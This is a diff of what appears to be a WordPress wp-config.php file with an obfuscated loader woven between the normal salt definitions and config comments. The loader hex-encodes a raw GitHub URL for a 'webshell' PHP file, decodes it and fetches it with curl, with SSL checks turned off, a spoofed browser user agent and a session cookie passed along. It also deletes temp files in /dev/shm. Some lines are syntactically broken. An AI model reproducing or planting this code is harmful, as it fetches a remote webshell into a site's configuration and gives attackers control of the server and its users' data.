@@ -64,28 +64,19 @@ function geturlsinfo($url) {
    define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
   define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
 define( 'NONCE_SALT',       'put your unique phrase here' );
-            function geturlsinfo($url) {
-         if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
+         function geturlsinfo($url) {
+          if (function_exists('curl_exec')) {
+          $conn = curl_init($url);
          opt1 = constant('CURLOPT_RETURNTRANSFER');
         $opt2 = constant('CURLOPT_FOLLOWLOCATION');
-           $opt3 = constant('CURLOPT_USERAGENT');   
-             
-/**#@-*/
-/**
- * WordPress database table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-             
-$opt4 = constant('CURLOPT_SSL_VERIFYPEER');
-$opt5 = constant('CURLOPT_SSL_VERIFYHOST');
+           $opt3 = constant('CURLOPT_USERAGENT');                         
+   $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
+ $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
 $opt6 = constant('CURLOPT_COOKIE');
 curl_setopt($conn, $opt1, 1);
    curl_setopt($conn, $opt2, 1);
      curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-      curl_setopt($conn, $opt4, 0);
+       curl_setopt($conn, $opt4, 0);
             curl_setopt($conn, $opt5, 0);
              
 /**
@@ -104,8 +95,7 @@ define( 'WP_DEBUG', false );
              
 /* Add any custom values between this line and the "stop editing" line. */
 if (isset($_SESSION['java'])) {
-          
-    curl_setopt($conn, $opt6, $_SESSION['java']);
+           curl_setopt($conn, $opt6, $_SESSION['java']);
      }
         $url_get_contents_data = curl_exec($conn);
         curl_close($conn);
@@ -119,19 +109,24 @@ if (isset($_SESSION['java'])) {
         $url_get_contents_data = false;
     }
     return $url_get_contents_data;
-}        
+ }        
 $bssn.go.id 
-    = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746562736e2e706870'; 
-    function hex2str($hex) {
-   
-        $str = '';
-    for ($i = 0; $i < strlen($hex); $i += 2) {
+ = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746562736e2e706870';
+/**#@-*/
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+function hex2str($hex) {
+   $str = '';
+     for ($i = 0; $i < strlen($hex); $i += 2) {
     
         $str .= chr(hexdec(substr($hex, $i, 2)));
     }
     return $str;
 }
-
 function clean_old_temp_files() {
     $temp_files = glob('/dev/shm/prefix*');
     foreach ($temp_files as $file) {
@@ -139,9 +134,7 @@ function clean_old_temp_files() {
             unlink($file);
         }
     }
-}
-
-        
+}        
 clean_old_temp_files();
 $url = hex2str($bssn.go.id);$a = 
 geturlsinfo($url);
